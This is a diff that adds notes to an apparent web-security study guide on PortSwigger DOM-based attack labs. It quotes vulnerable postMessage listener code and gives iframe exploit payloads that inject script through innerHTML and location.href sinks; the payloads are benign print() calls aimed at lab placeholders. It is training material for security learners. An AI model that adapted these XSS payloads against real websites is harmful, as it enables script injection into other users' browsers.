@@ -2706,6 +2706,34 @@ Content-Type: application/json
 - Testing for DOM XSS using [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
 
 ### DOM-based Attacks Lab
+https://portswigger.net/web-security/dom-based  
+- DOM XSS using **web messages**
+  - Discover > home page > Find script > addEventListener()
+    ```
+    window.addEventListener('message', function(e) {
+                            document.getElementById('ads').innerHTML = e.data;
+                        })
+    ```
+  - Exploit server
+    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
+- DOM XSS using web messages and a JavaScript URL
+  - Discover > home page > Find script > addEventListener() > The JavaScript contains a flawed indexOf() check that looks for the strings "http:" or "https:" anywhere within the web message. It also contains the sink location.href.
+    ```
+    window.addEventListener('message', function(e) {
+                            var url = e.data;
+                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+                                location.href = url;
+                            }
+                        }, false);
+    ```
+  - Exploit server
+    `iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
+  - When the iframe loads, the postMessage() method sends the JavaScript payload to the main page. The event listener spots the "http:" string and proceeds to send the payload to the location.href sink, where the print() function is called.
+- DOM XSS using web messages and JSON.parse
+- DOM-based open redirection
+- DOM-based cookie manipulation
+- Exploiting DOM clobbering to enable XSS
+- Clobbering DOM attributes to bypass HTML filters  
 - DOM XSS in **document.write** sink using source location.search  
   Test random alphanumeric string "hello123"  
   ```<img src="/resources/images/tracker.gif?searchTerms=hello123">```  
